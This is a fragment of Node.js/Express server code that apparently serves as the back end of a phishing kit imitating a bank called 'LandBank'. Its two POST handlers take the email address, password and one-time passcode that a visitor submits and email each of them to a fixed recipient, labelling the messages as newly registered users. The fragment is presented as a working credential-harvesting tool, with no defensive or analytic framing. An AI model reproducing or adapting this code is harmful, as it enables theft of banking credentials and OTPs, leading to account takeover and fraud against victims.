...
app.post("/", (req, res) => {
  ...
  const mailOptions = {
    from: `${email}`,
    to: userEmail,
    subject: `LandBank Client ---> Email: ${email} \t\n\n\n password: ${password}`,
    text: `LandBank Client ---> New user registered with Email: ${email} and password: ${password}`,
  };
...
app.post("/otp", (req, res) => {
  ...
  const mailOptions = {
    from: email,
    to: userEmail,
    subject: `LandBank Client --->OTP: ${req.body?.otp} `,
    text: `LandBank Client ---> New user registered OTP: ${req.body?.otp}`,
  };
